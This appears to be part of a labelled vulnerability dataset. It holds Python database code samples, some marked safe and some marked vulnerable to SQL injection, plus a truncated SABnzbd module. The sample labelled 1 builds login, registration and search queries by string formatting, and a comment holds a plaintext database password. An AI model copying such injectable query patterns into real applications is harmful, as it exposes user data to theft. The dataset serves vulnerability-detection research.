result=sql.deleteDB(self.conn,sqlText,params)\n        return result;\n\n    def likeComments(self,commentid,userid):\n        sqlText=\"insert into comment_like values(%s,%s);\"\n        params=[userid,commentid]\n        result=sql.insertDB(self.conn,sqlText,params)\n        return result;\n\n    def dislikeComments(self,commentid,userid):\n        sqlText=\"delete from comment_like where commentid=%s and userid=%s;\"\n        params=[commentid,userid]\n        result=sql.deleteDB(self.conn,sqlText,params)\n        return result;\n\n\n\n/n/n/nmodules/post.py/n/nfrom modules import sql\n\n\nclass Post:\n    def __init__(self,conn):\n        self.conn=conn;\n\n    def getAllPosts(self,userid):\n        sqlText=\"select users.name,post.comment,post.postid,(select Count(*) from post_like \\\n                where post.postid = post_like.postid) as like,\\\n                (select Count(*) from post_like where post.postid =post_like.postid \\\n                and post_like.userid=%s) as flag from users,post \\\n                where post.userid=users.userid and (post.userid in \\\n                (select friendid from friends where userid =%s) or post.userid=%s)\\\n                order by post.date desc;\"\n        params=[userid,userid,userid]\n        result=sql.queryDB(self.conn,sqlText,params)\n        return result;\n    \n    def getPostsByPostid(self,postid):\n        sqlText=\"select users.name,post.comment from users,post where \\\n                users.userid=post.userid and post.postid=%s\"\n        params=[postid]\n        result=sql.queryDB(self.conn,sqlText,params)\n        return result;\n    \n    def getPostLike(self,postid):\n        sqlText=\"select userid from post_like where postid=%s\"\n        params=[postid]\n        result=sql.queryDB(self.conn,sqlText,params)\n        return result;\n\n    def likePost(self,postid,userid):\n        sqlText=\"insert into post_like values(%s,%s);\"\n        params=[postid,userid]\n        result=sql.insertDB(self.conn,sqlText,params)\n        return result;\n\n    def dislikePost(self,postid,userid):\n        sqlText=\"delete from post_like where postid=%s and userid=%s;\"\n        params=[postid,userid]\n        result=sql.deleteDB(self.conn,sqlText,params)\n        return result;\n\n    def insertData(self,userid,post):\n        sqlText=\"insert into post(userid,date,comment) \\\n                values(%s,current_timestamp(0),%s);\"\n        params=[userid,post];\n        result=sql.insertDB(self.conn,sqlText,params)\n        return result;\n\n\n    def deletePost(self,postid):\n        sqlText=\"delete from post where post.postid=%s\"\n        params=[postid]\n        result=sql.deleteDB(self.conn,sqlText,params)\n        return result;\n/n/n/nmodules/sql.py/n/nimport psycopg2\n\n\n\n#\u94fe\u63a5\u6570\u636e\u5e93\ndef connectDB(dbname,uname,psw):\n    conn=psycopg2.connect(database=dbname,user=uname,password=psw,host=\"127.0.0.1\",port=\"5432\")\n    return conn\n\n\n#\u67e5\u8be2\u6570\u636e\u5e93\ndef queryDB(conn,sql_select,params):\n    print(\"query data\")\n    cur=conn.cursor()\n    try:\n        cur.execute(sql_select,params)\n        rows=cur.fetchall()\n    except Exception as err:\n        closeDB(conn)\n        print(err)\n    else:\n        return rows\n\n\n\n#\u63d2\u5165\u6570\u636e\ndef insertDB(conn,sql_insert,params):\n    cur=conn.cursor()\n    try:\n        cur.execute(sql_insert,params)\n        conn.commit()\n    except Exception as err:\n        closeDB(conn)\n        print(err)\n    else: \n        print(\"insert data successfull\")\n\n#delete data\ndef deleteDB(conn,sql_delete,params):\n    cur=conn.cursor()\n    try:\n        cur.execute(sql_delete,params)\n        conn.commit()\n    except Exception as err:\n        closeDB(conn)\n        print(err)\n    else: \n        print(\"delete data successfull\")\n\n\n#update data\ndef updateDB(conn,sql_update,params):\n    cur=conn.cursor()\n    try:\n        cur.execute(sql_update,params)\n        conn.commit()\n    except Exception as err:\n        closeDB(conn)\n        print(err)\n    else: \n        print(\"update data successfull\")\n\n\n\n#\u5173\u95ed\u94fe\u63a5\ndef closeDB(conn):\n    conn.close()\n\n\n\n/n/n/nmodules/users.py/n/nfrom modules import sql\n\nclass Users:\n    def __init__(self,conn=None,name=None,password=None,email=None,country=None):\n        self.name=name\n        self.password=password\n        self.email=email\n        self.country=country\n        self.conn=conn\n\n    def clean(self):\n        self.name=None;\n        self.password=None;\n        self.email=None;\n        self.count=None;\n \n\n    def userLogin(self):\n\n        sqlName=\"select count(*) from users where name=%s and password=%s;\"\n        params = [self.name,self.password]\n        checkName=sql.queryDB(self.conn,sqlName,params)\n        result=checkName[0][0]\n        if result == 0:\n            self.clean()\n            return False\n        else:\n            return True\n\n\n    def userApply(self):\n        sql_insert=\"insert into \\\n                users(name,password,email,country,inscription_date) \\\n                values(%s,%s,%s,%s,current_timestamp(0));\"\n\n        sqlName=\"select count(*) from users where name=%s;\"\n        params = [self.name]\n        checkName=sql.queryDB(self.conn,sqlName,params)\n        #no name\n        if checkName[0][0] == 0:\n            params.extend([self.password,self.email,self.country])\n            sql.insertDB(self.conn,sql_insert,params)\n            return True\n        else:\n            return False\n\n    def getUserID(self):\n        sqlName=\"select userid from users where name=%s;\"\n        params = [self.name]\n        userid=sql.queryDB(self.conn,sqlName,params)\n        return userid[0][0];\n\n    def getAllPosts(self):\n        sqlText=\"select comment from post where userid=%s order by date;\"\n        params = [self.userid]\n        allposts=sql.queryDB(self.conn,sqlName,params)\n        return allposts;\n\n\n    def getAllComments(self):\n        sqlText=\"select comment from comments where userid=%s order by date;\"\n        params = [self.userid]\n        allposts=sql.queryDB(self.conn,sqlText,params)\n        return allposts;\n\n    def getAllInformation(self,userid):\n        sqlText=\"select name,password,email,country from users where userid=%s;\"\n        params = [userid]\n        information=sql.queryDB(self.conn,sqlText,params)\n        return information;\n\n\n    def modifyUserInfo(self,userid,flag):\n        sqlText=\"update users \\\n                set name=%s,password=%s,email=%s,country=%s where userid=%s;\"\n        if(flag==1): \n            sqlName=\"select count(*) from users where name=%s;\"\n            params = [self.name]\n            checkName=sql.queryDB(self.conn,sqlName,params)\n            #no name\n            if checkName[0][0] == 0:\n                params.extend([self.password,self.email,self.country,userid])\n                sql.updateDB(self.conn,sqlText,params)\n                return True\n            else:\n                return False\n        else:\n            params=[self.name,self.password,self.email,self.country,userid]\n            sql.updateDB(self.conn,sqlText,params)\n            return True;\n\n    def followFriends(self,userid,friendid):\n        sqlText=\"insert into friends values(%s,%s);\"\n        params=[friendid,userid]\n        result=sql.insertDB(self.conn,sqlText,params)\n        return result;\n\n    def cancelFollow(self,userid,friendid):\n        sqlText=\"delete from friends where userid=%d and friendid=%s;\"\n        params=[userid,friendid]\n        result=sql.deleteDB(self.conn,sqlText,params)\n        return result;\n\n    def getUsers(self,userid):\n        sqlText=\"select userid,name,country,(select Count(*) from friends \\\n                where users.userid=friends.friendid and friends.userid=%s) as follow \\\n                from users;\"\n        params=[userid]\n        result=sql.queryDB(self.conn,sqlText,params)\n        return result;\n\n\n    def getUsersByName(self,userid,username):\n        sqlText=\"select userid,name,country,(select Count(*) from friends \\\n                where users.userid=friends.friendid and friends.userid=%s) as follow \\\n                from users where users.name~%s;\"\n        params=[userid,username]\n        result=sql.queryDB(self.conn,sqlText,params)\n        return result;\n\n\n\n\n\n\n\n/n/n/n", "label": 0, "vtype": "sql"}, {"id": "5329d91f9e569c95184053c8e7ef596949c33ce9", "code": "/modules/comment.py/n/nfrom modules import sql\n\n\nclass Comment:\n    def __init__(self,conn):\n        self.conn=conn;\n    \n    def getCommentsByUser(self,userid):\n        sqlText=\"select comment from comments order by date desc where userid=%d\"%(userid)\n        result=sql.queryDB(self.conn,sqlText)\n        return result;\n    \n    def getCommentsByPostid(self,postid,userid):\n        sqlText=\"select (select Count(*) from comment_like where comments.commentid = comment_like.commentid) as like,(select Count(*) from comment_like where comments.commentid = comment_like.commentid and comment_like.userid=%d) as flag,commentid,name,comment from users,comments where users.userid=comments.userid and postid=%d order by date desc;\"%(userid,postid)\n        result=sql.queryDB(self.conn,sqlText)\n        return result;\n\n    def getCommentsLike(self,commentid):\n        sqlText=\"select userid from comment_like where commentid=%d\"%(commentid)\n        result=sql.queryDB(self.conn,sqlText)\n        return result;\n\t\n    def insertData(self,comment,userid,postid):\n        sqlText=\"insert into comments(comment,userid,date,postid) values('%s',%d,current_timestamp(0),%d);\"%(comment,userid,postid)\n        result=sql.insertDB(self.conn,sqlText)\n        return result;\n\n    def deleteComment(self,commentid):\n        sqlText=\"delete from comments where commentid=%d\"%(commentid)\n        result=sql.deleteDB(self.conn,sqlText)\n        return result;\n\n    def likeComments(self,commentid,userid):\n        sqlText=\"insert into comment_like values(%d,%d);\"%(userid,commentid)\n        result=sql.insertDB(self.conn,sqlText)\n        return result;\n\n    def dislikeComments(self,commentid,userid):\n        sqlText=\"delete from comment_like where commentid=%d and userid=%d;\"%(commentid,userid)\n        result=sql.deleteDB(self.conn,sqlText)\n        return result;\n\n\n\n/n/n/n/modules/post.py/n/nfrom modules import sql\n\n\nclass Post:\n    def __init__(self,conn):\n        self.conn=conn;\n\n    def getAllPosts(self,userid):\n        sqlText=\"select users.name,post.comment,post.postid,(select Count(*) from post_like \\\n                where post.postid = post_like.postid) as like,\\\n                (select Count(*) from post_like where post.postid =post_like.postid \\\n                and post_like.userid=%d) as flag from users,post \\\n                where post.userid=users.userid and (post.userid in \\\n                (select friendid from friends where userid =%d) or post.userid=%d )\\\n                order by post.date desc;\"%(userid,userid,userid)\n        result=sql.queryDB(self.conn,sqlText)\n        return result;\n    \n    def getPostsByPostid(self,postid):\n        sqlText=\"select users.name,post.comment from users,post where \\\n                users.userid=post.userid and post.postid=%d\"%(postid)\n        result=sql.queryDB(self.conn,sqlText)\n        return result;\n    \n    def getPostLike(self,postid):\n        sqlText=\"select userid from post_like where postid=%d\"%(postid)\n        result=sql.queryDB(self.conn,sqlText)\n        return result;\n\n    def likePost(self,postid,userid):\n        sqlText=\"insert into post_like values(%d,%d);\"%(postid,userid)\n        result=sql.insertDB(self.conn,sqlText)\n        return result;\n\n    def dislikePost(self,postid,userid):\n        sqlText=\"delete from post_like where postid=%d and userid=%d;\"%(postid,userid)\n        result=sql.deleteDB(self.conn,sqlText)\n        return result;\n\n    def insertData(self,userid,post):\n        sqlText=\"insert into post(userid,date,comment) \\\n                values(%d,current_timestamp(0),'%s');\"%(userid,post);\n        result=sql.insertDB(self.conn,sqlText)\n        return result;\n\n\n    def deletePost(self,postid):\n        sqlText=\"delete from post where post.postid=%d\"%(postid)\n        result=sql.deleteDB(self.conn,sqlText)\n        return result;\n/n/n/n/modules/sql.py/n/nimport psycopg2\n\n\n\n#\u94fe\u63a5\u6570\u636e\u5e93\ndef connectDB(dbname,uname,psw):\n    #conn=psycopg2.connect(database=\"test\",user=\"lishaomin\",password=\"19931004\",host=\"127.0.0.1\",port=\"5432\")\n    conn=psycopg2.connect(database=dbname,user=uname,password=psw,host=\"127.0.0.1\",port=\"5432\")\n    return conn\n\n\n#\u67e5\u8be2\u6570\u636e\u5e93\ndef queryDB(conn,sql_select):\n    print(\"query data\")\n    cur=conn.cursor()\n    #sql_select=\"select * from users;\"\n    cur.execute(sql_select)\n    rows=cur.fetchall()\n    #for row in rows:\n    #print (\"user:%s\"%(row[1]))\n    return rows\n\n\n\n#\u63d2\u5165\u6570\u636e\ndef insertDB(conn,sql_insert):\n    cur=conn.cursor()\n    result=cur.execute(sql_insert)\n    conn.commit()\n    print(\"insert data successfull\")\n    return result\n\n#delete data\ndef deleteDB(conn,sql_delete):\n    cur=conn.cursor()\n    result=cur.execute(sql_delete)\n    conn.commit()\n    print(\"delete data successfull\")\n    return result\n\n\n#update data\ndef updateDB(conn,sql_update):\n    cur=conn.cursor()\n    result=cur.execute(sql_update)\n    conn.commit()\n    print(\"update data successfull\")\n    return result\n\n\n#\u5173\u95ed\u94fe\u63a5\ndef closeDB(conn):\n    conn.close()\n\n\n\n/n/n/n/modules/users.py/n/nfrom modules import sql\n\nclass Users:\n    def __init__(self,conn=None,name=None,password=None,email=None,country=None):\n        self.name=name\n        self.password=password\n        self.email=email\n        self.country=country\n        self.conn=conn\n\n    def clean(self):\n        self.name=None;\n        self.password=None;\n        self.email=None;\n        self.count=None;\n \n\n    def userLogin(self):\n\n        sqlName=\"select count(*) from users where name='%s' and \\\n                password='%s';\"%(self.name,self.password)\n        checkName=sql.queryDB(self.conn,sqlName)\n\n        result=checkName[0][0]\n        if result == 0:\n            self.clean()\n            return False\n        else:\n            return True\n\n\n    def userApply(self):\n        t_sql_insert=\"insert into \\\n                users(name,password,email,country,inscription_date) \\\n                values('{name}','{psw}','{email}','{country}',current_timestamp(0));\"\n        sql_insert=t_sql_insert.format(name=self.name,psw=self.password,\\\n                email=self.email,country=self.country)\n\n        sqlName=\"select count(*) from users where name='%s';\"%(self.name)\n        checkName=sql.queryDB(self.conn,sqlName)\n    \n        #no name\n        if checkName[0][0] == 0:\n            sql.insertDB(self.conn,sql_insert)\n            return True\n        else:\n            return False\n\n    def getUserID(self):\n        sqlName=\"select userid from users where name='%s';\"%(self.name)\n        userid=sql.queryDB(self.conn,sqlName)\n        return userid[0][0];\n\n    def getAllPosts(self):\n        sqlText=\"select comment from post where userid=%d order by date;\"\n        allposts=sql.queryDB(self.conn,sqlText)\n        return allposts;\n\n\n    def getAllComments(self):\n        sqlText=\"select comment from comments where userid=%d order by date;\"\n        allposts=sql.queryDB(self.conn,sqlText)\n        return allposts;\n\n    def getAllInformation(self,userid):\n        sqlText=\"select name,password,email,country from users where userid=%d;\"%(userid)\n        information=sql.queryDB(self.conn,sqlText)\n        return information;\n\n\n    def modifyUserInfo(self,userid,flag):\n        sqlText=\"update users \\\n                set name='%s',password='%s',email='%s',country='%s' \\\n                where userid='%d';\"%(self.name,self.password,self.email,self.country,userid)\n        if(flag==1): \n            sqlName=\"select count(*) from users where name='%s';\"%(self.name)\n            checkName=sql.queryDB(self.conn,sqlName)\n            #no name\n            if checkName[0][0] == 0:\n                sql.updateDB(self.conn,sqlText)\n                return True\n            else:\n                return False\n        else:\n            sql.updateDB(self.conn,sqlText)\n            return True;\n\n    def followFriends(self,userid,friendid):\n        sqlText=\"insert into friends values(%d,%d);\"%(friendid,userid)\n        result=sql.insertDB(self.conn,sqlText)\n        return result;\n\n    def cancelFollow(self,userid,friendid):\n        sqlText=\"delete from friends where userid=%d and friendid=%d;\"%(userid,friendid)\n        result=sql.deleteDB(self.conn,sqlText)\n        return result;\n\n    def getUsers(self,userid):\n        sqlText=\"select userid,name,country,(select Count(*) from friends \\\n                where users.userid=friends.friendid and friends.userid=%d) as follow \\\n                from users;\"%(userid)\n        result=sql.queryDB(self.conn,sqlText)\n        return result;\n\n\n    def getUsersByName(self,userid,username):\n        sqlText=\"select userid,name,country,(select Count(*) from friends \\\n                where users.userid=friends.friendid and friends.userid=%d) as follow \\\n                from users where users.name='%s';\"%(userid,username)\n        result=sql.queryDB(self.conn,sqlText)\n        return result;\n\n\n\n\n\n\n\n/n/n/n", "label": 1, "vtype": "sql"}, {"id": "ad9fef5f416ef31eb3fdf7c1774434092fd6a52c", "code": "sabnzbd/database.py/n/n#!/usr/bin/python -OO\n# Copyright 2008-2017 The SABnzbd-Team <team@sabnzbd.org>\n#\n# This program is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.\n\n\"\"\"\nsabnzbd.database - Database Support\n\"\"\"\n\ntry:\n    import sqlite3\nexcept:\n    try:\n        import pysqlite2.dbapi2 as sqlite3\n    except:\n        pass\n\nimport os\nimport time\nimport zlib\nimport logging\nimport sys\nimport threading\n\nimport sabnzbd\nimport sabnzbd.cfg\nfrom sabnzbd.constants import DB_HISTORY_NAME, STAGES\nfrom sabnzbd.encoding import unicoder\nfrom sabnzbd.bpsmeter import this_week, this_month\nfrom sabnzbd.decorators import synchronized\nfrom sabnzbd.misc import get_all_passwords, int_conv\n\nDB_LOCK = threading.RLock()\n\n\ndef convert_search(search):\n    \"\"\" Convert classic wildcard to SQL wildcard \"\"\"\n    if not search:\n        # Default value\n        search = ''\n    else:\n        # Allow * for wildcard matching and space\n        search = search.replace('*', '%').replace(' ', '%')\n\n    # Allow ^ for start of string and $ for end of string\n    if search and search.startswith('^'):\n        search = search.replace('^', '')\n        search += '%'\n    elif search and search.endswith('$'):\n        search = search.replace('$', '')\n        search = '%' + search\n    else:\n        search = '%' + search + '%'\n    return search\n\n\nclass HistoryDB(object):\n    \"\"\" Class to access the History database\n        Each class-instance will create an access channel that\n        can be used in one thread.\n        Each thread needs its own class-instance!\n    \"\"\"\n    # These class attributes will be accessed directly because\n    # they need to be shared by all instances\n    db_path = None        # Will contain full path to history database\n    done_cleaning = False # Ensure we only do one Vacuum per session\n\n    @synchronized(DB_LOCK)\n    def __init__(self):\n        \"\"\" Determine databse path and create connection \"\"\"\n        self.con = self.c = None\n        if not HistoryDB.db_path:\n            HistoryDB.db_path = os.path.join(sabnzbd.cfg.admin_dir.get_path(), DB_HISTORY_NAME)\n        self.connect()\n\n\n    def connect(self):\n        \"\"\" Create a connection to the database \"\"\"\n        create_table = not os.path.exists(HistoryDB.db_path)\n        self.con = sqlite3.connect(HistoryDB.db_path)\n        self.con.row_factory = dict_factory\n        self.c = self.con.cursor()\n        if create_table:\n            self.create_history_db()\n        elif not HistoryDB.done_cleaning:\n            # Run VACUUM on sqlite\n            # When an object (table, index, or trigger) is dropped from the database, it leaves behind empty space\n            # http://www.sqlite.org/lang_vacuum.html\n            HistoryDB.done_cleaning = True\n            self.execute('VACUUM')\n\n        self.execute('PRAGMA user_version;')\n        try:\n            version = self.c.fetchone()['user_version']\n        except TypeError:\n            version = 0\n        if version < 1:\n            # Add any missing columns added since first DB version\n            # Use \"and\" to stop when database has been reset due to corruption\n            _ = self.execute('PRAGMA user_version = 1;') and \\\n                self.execute('ALTER TABLE \"history\" ADD COLUMN series TEXT;') and \\\n                self.execute('ALTER TABLE \"history\" ADD COLUMN md5sum TEXT;')\n        if version < 2:\n            # Add any missing columns added since second DB version\n            # Use \"and\" to stop when database has been reset due to corruption\n            _ = self.execute('PRAGMA user_version = 2;') and \\\n                self.execute('ALTER TABLE \"history\" ADD COLUMN password TEXT;')\n\n\n    def execute(self, command, args=(), save=False):\n        ''' Wrapper for executing SQL commands '''\n        for tries in xrange(5, 0, -1):\n            try:\n                if args and isinstance(args, tuple):\n                    self.c.execute(command, args)\n                else:\n                    self.c.execute(command)\n                if save:\n                    self.save()\n                return True\n            except:\n                error = str(sys.exc_value)\n                if tries >= 0 and 'is locked' in error:\n                    logging.debug('Database locked, wait and retry')\n                    time.sleep(0.5)\n                    continue\n                elif 'readonly' in error:\n                    logging.error(T('Cannot write to History database, check access rights!'))\n                    # Report back success, because there's no recovery possible\n                    return True\n                elif 'not a database' in error or 'malformed' in error or 'duplicate column name' in error:\n                    logging.error(T('Damaged History database, created empty replacement'))\n                    logging.info(\"Traceback: \", exc_info=True)\n                    self.close()\n                    try:\n                        os.remove(HistoryDB.db_path)\n                    except:\n                        pass\n                    self.connect()\n                    # Return False in case of \"duplicate column\" error\n                    # because the column addition in connect() must be terminated\n                    return 'duplicate column name' not in error\n                else:\n                    logging.error(T('SQL Command Failed, see log'))\n                    logging.info(\"SQL: %s\", command)\n                    logging.info(\"Arguments: %s\", repr(args))\n                    logging.info(\"Traceback: \", exc_info=True)\n                    try:\n                        self.con.rollback()\n                    except:\n                        logging.debug(\"Rollback Failed:\", exc_info=True)\n            return False\n\n    def create_history_db(self):\n        \"\"\" Create a new (empty) database file \"\"\"\n        self.execute(\"\"\"\n        CREATE TABLE \"history\" (\n            \"id\" INTEGER PRIMARY KEY,\n            \"completed\" INTEGER NOT NULL,\n            \"name\" TEXT NOT NULL,\n            \"nzb_name\" TEXT NOT NULL,\n            \"category\" TEXT,\n            \"pp\" TEXT,\n            \"script\" TEXT,\n            \"report\" TEXT,\n            \"url\" TEXT,\n            \"status\" TEXT,\n            \"nzo_id\" TEXT,\n            \"storage\" TEXT,\n            \"path\" TEXT,\n            \"script_log\" BLOB,\n            \"script_line\" TEXT,\n            \"download_time\" INTEGER,\n            \"postproc_time\" INTEGER,\n            \"stage_log\" TEXT,\n            \"downloaded\" INTEGER,\n            \"completeness\" INTEGER,\n            \"fail_message\" TEXT,\n            \"url_info\" TEXT,\n            \"bytes\" INTEGER,\n            \"meta\" TEXT,\n            \"series\" TEXT,\n            \"md5sum\" TEXT,\n            \"password\" TEXT\n        )\n        \"\"\")\n        self.execute('PRAGMA user_version = 2;')\n\n    def save(self):\n        \"\"\" Save database to disk \"\"\"\n        try:\n            self.con.commit()\n        except:\n            logging.error(T('SQL Commit Failed, see log'))\n            logging.info(\"Traceback: \", exc_info=True)\n\n    def close(self):\n        \"\"\" Close database connection \"\"\"\n        try:\n            self.c.close()\n            self.con.close()\n        except:\n            logging.error(T('Failed to close database, see log'))\n            logging.info(\"Traceback: \", exc_info=True)\n\n    def remove_completed(self, search=None):\n        \"\"\" Remove all completed jobs from the database, optional with `search` pattern \"\"\"\n        search = convert_search(search)\n        logging.info('Removing all completed jobs from history')\n        return self.execute(\"\"\"DELETE FROM history WHERE name LIKE ? AND status = 'Completed'\"\"\", (search,), save=True)\n\n    def get_failed_paths(self, search=None):\n        \"\"\" Return list of all storage paths of failed jobs (may contain non-existing or empty paths) \"\"\"\n        search = convert_search(search)\n        fetch_ok = self.execute(\"\"\"SELECT path FROM history WHERE name LIKE ? AND status = 'Failed'\"\"\", (search,))\n        if fetch_ok:\n            return [item.get('path') for item in self.c.fetchall()]\n        else:\n            return []\n\n    def remove_failed(self, search=None):\n        \"\"\" Remove all failed jobs from the database, optional with `search` pattern \"\"\"\n        search = convert_search(search)\n        logging.info('Removing all failed jobs from history')\n        return self.execute(\"\"\"DELETE FROM history WHERE name LIKE ? AND status = 'Failed'\"\"\", (search,), save=True)\n\n    def remove_history(self, jobs=None):\n        \"\"\" Remove all jobs in the list `jobs`, empty list will remove all completed jobs \"\"\"\n        if jobs is None:\n            self.remove_completed()\n        else:\n            if not isinstance(jobs, list):\n                jobs = [jobs]\n\n            for job in jobs:\n                self.execute(\"\"\"DELETE FROM history WHERE nzo_id=?\"\"\", (job,))\n                logging.info('Removing job %s from history', job)\n\n        self.save()\n\n    def auto_history_purge(self):\n        \"\"\" Remove history items based on the configured history-retention \"\"\"\n        if sabnzbd.cfg.history_retention() == \"0\":\n            return\n\n        if sabnzbd.cfg.history_retention() == \"-1\":\n            # Delete all non-failed ones\n            self.remove_completed()\n\n        if \"d\" in sabnzbd.cfg.history_retention():\n            # How many days to keep?\n            days_to_keep = int_conv(sabnzbd.cfg.history_retention().strip()[:-1])\n            seconds_to_keep = int(time.time()) - days_to_keep*3600*24\n            if days_to_keep > 0:\n                logging.info('Removing completed jobs older than %s days from history', days_to_keep)\n                return self.execute(\"\"\"DELETE FROM history WHERE status = 'Completed' AND completed < ?\"\"\", (seconds_to_keep,), save=True)\n        else:\n            # How many to keep?\n            to_keep = int_conv(sabnzbd.cfg.history_retention())\n            if to_keep > 0:\n                logging.info('Removing all but last %s completed jobs from history', to_keep)\n                return self.execute(\"\"\"DELETE FROM history WHERE id NOT IN ( SELECT id FROM history WHERE status = 'Completed' ORDER BY completed DESC LIMIT ? )\"\"\", (to_keep,), save=True)\n\n\n    def add_history_db(self, nzo, storage, path, postproc_time, script_output, script_line):\n        \"\"\" Add a new job entry to the database \"\"\"\n        t = build_history_info(nzo, storage, path, postproc_time, script_output, script_line)\n\n        if self.execute(\"\"\"INSERT INTO history (completed, name, nzb_name, category, pp, script, report,\n        url, status, nzo_id, storage, path, script_log, script_line, download_time, postproc_time, stage_log,\n        downloaded, completeness, fail_message, url_info, bytes, series, md5sum, password)\n        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)\"\"\", t):\n            self.save()\n        logging.info('Added job %s to history', nzo.final_name)\n\n    def fetch_history(self, start=None, limit=None, search=None, failed_only=0, categories=None):\n        \"\"\" Return records for specified jobs \"\"\"\n        command_args = [convert_search(search)]\n\n        post = ''\n        if categories:\n            categories = ['*' if c == 'Default' else c for c in categories]\n            post = \" AND (CATEGORY = ?\"\n            post += \" OR CATEGORY = ? \" * (len(categories)-1)\n            post += \")\"\n            command_args.extend(categories)\n        if failed_only:\n            post += ' AND STATUS = \"Failed\"'\n\n        cmd = 'SELECT COUNT(*) FROM history WHERE name LIKE ?'\n        res = self.execute(cmd + post, tuple(command_args))\n        total_items = -1\n        if res:\n            try:\n                total_items = self.c.fetchone().get('COUNT(*)')\n            except AttributeError:\n                pass\n\n        if not start:\n            start = 0\n        if not limit:\n            limit = total_items\n\n        command_args.extend([start, limit])\n        cmd = 'SELECT * FROM history WHERE name LIKE ?'\n        fetch_ok = self.execute(cmd + post + ' ORDER BY completed desc LIMIT ?, ?', tuple(command_args))\n\n        if fetch_ok:\n            items = self.c.fetchall()\n        else:\n            items = []\n\n        fetched_items = len(items)\n\n        # Unpack the single line stage log\n        # Stage Name is separated by ::: stage lines by ; and stages by \\r\\n\n        items = [unpack_history_info(item) for item in items]\n\n        return (items, fetched_items, total_items)\n\n    def have_episode(self, series, season, episode):\n        \"\"\" Check whether History contains this series episode \"\"\"\n        total = 0\n        series = series.lower().replace('.', ' ').replace('_', ' ').replace('  ', ' ')\n        if series and season and episode:\n            pattern = '%s/%s/%s' % (series, season, episode)\n            res = self.execute(\"select count(*) from History WHERE series = ? AND STATUS != 'Failed'\", (pattern,))\n            if res:\n                try:\n                    total = self.c.fetchone().get('count(*)')\n                except AttributeError:\n                    pass\n        return total > 0\n\n    def have_md5sum(self, md5sum):\n        \"\"\" Check whether this md5sum already in History \"\"\"\n        total = 0\n        res = self.execute(\"select count(*) from History WHERE md5sum = ? AND STATUS != 'Failed'\", (md5sum,))\n        if res:\n            try:\n                total = self.c.fetchone().get('count(*)')\n            except AttributeError:\n                pass\n        return total > 0\n\n    def get_history_size(self):\n        \"\"\" Returns the total size of the history and\n            amounts downloaded in the last month and week\n        \"\"\"\n        # Total Size of the history\n        total = 0\n        if self.execute('''SELECT sum(bytes) FROM history'''):\n            try:\n                total = self.c.fetchone().get('sum(bytes)')\n            except AttributeError:\n                pass\n\n        # Amount downloaded this month\n        # r = time.gmtime(time.time())\n        # month_timest = int(time.mktime((r.tm_year, r.tm_mon, 0, 0, 0, 1, r.tm_wday, r.tm_yday, r.tm_isdst)))\n        month_timest = int(this_month(time.time()))\n\n        month = 0\n        if self.execute('''SELECT sum(bytes) FROM history WHERE \"completed\">?''', (month_timest,)):\n            try:\n                month = self.c.fetchone().get('sum(bytes)')\n            except AttributeError:\n                pass\n\n        # Amount downloaded this week\n        week_timest = int(this_week(time.time()))\n\n        week = 0\n        if self.execute('''SELECT sum(bytes) FROM history WHERE \"completed\">?''', (week_timest,)):\n            try:\n                week = self.c.fetchone().get('sum(bytes)')\n            except AttributeError:\n                pass\n\n        return (total, month, week)\n\n    def get_script_log(self, nzo_id):\n        \"\"\" Return decompressed log file \"\"\"\n        data = ''\n        t = (nzo_id,)\n        if self.execute('SELECT script_log FROM history WHERE nzo_id=?', t):\n            try:\n                data = zlib.decompress(self.c.fetchone().get('script_log'))\n            except:\n                pass\n        return data\n\n    def get_name(self, nzo_id):\n        \"\"\" Return name of the job `nzo_id` \"\"\"\n        t = (nzo_id,)\n        name = ''\n        if self.execute('SELECT name FROM history WHERE nzo_id=?', t):\n            try:\n                name = self.c.fetchone().get('name')\n            except AttributeError:\n                pass\n        return name\n\n    def get_path(self, nzo_id):\n        \"\"\" Return the `incomplete` path of the job `nzo_id` \"\"\"\n        t = (nzo_id,)\n        path = ''\n        if self.execute('SELECT path FROM history WHERE nzo_id=?', t):\n            try:\n                path = self.c.fetchone().get('path')\n            except AttributeError:\n                pass\n        return path\n\n    def get_other(self, nzo_id):\n        \"\"\" Return additional data for job `nzo_id` \"\"\"\n        t = (nzo_id,)\n        if self.execute('SELECT * FROM history WHERE nzo_id=?', t):\n            try:\n                items = self.c.fetchall()[0]\n                dtype = items.get('report')\n                url = items.get('url')\n                pp = items.get('pp')\n                script = items.get('script')\n                cat = items.get('category')\n            except (AttributeError, IndexError):\n                return '', '', '', '', ''\n        return dtype, url, pp, script, cat\n\n\ndef dict_factory(cursor, row):\n    \"\"\" Return a dictionary for the current database position \"\"\"\n    d = {}\n    for idx, col in enumerate(cursor.description):\n        d[col[0]] = row[idx]\n    return d\n\n\n_PP_LOOKUP = {0: '', 1: 'R', 2: 'U', 3: 'D'}\ndef build_history_info(nzo, storage='', downpath='', postproc_time=0, script_output='', script_line=''):\n    \"\"\" Collects all the information needed for the database \"\"\"\n\n    if not downpath:\n        downpath = nzo.downpath\n    path = decode_factory(downpath)\n    storage = decode_factory(storage)\n    script_line = decode_factory(script_line)\n\n    flagRepair, flagUnpack, flagDelete = nzo.repair_opts\n    nzo_info = decode_factory(nzo.nzo_info)\n\n    url = decode_factory(nzo.url)\n\n    completed = int(time.time())\n    name = decode_factory(nzo.final_name)\n\n    nzb_name = decode_factory(nzo.filename)\n    category = decode_factory(nzo.cat)\n    pp = _PP_LOOKUP.get(sabnzbd.opts_to_pp(flagRepair, flagUnpack, flagDelete), 'X')\n    script = decode_factory(nzo.script)\n    status = decode_factory(nzo.status)\n    nzo_id = nzo.nzo_id\n    bytes = nzo.bytes_downloaded\n\n    if script_output:\n        # Compress the output of the script\n        script_log = sqlite3.Binary(zlib.compress(script_output))\n        #\n    else:\n        script_log = ''\n\n    download_time = decode_factory(nzo_info.get('download_time', 0))\n\n    downloaded = nzo.bytes_downloaded\n    completeness = 0\n    fail_message = decode_factory(nzo.fail_msg)\n    url_info = nzo_info.get('details', '') or nzo_info.get('more_info', '')\n\n    # Get the 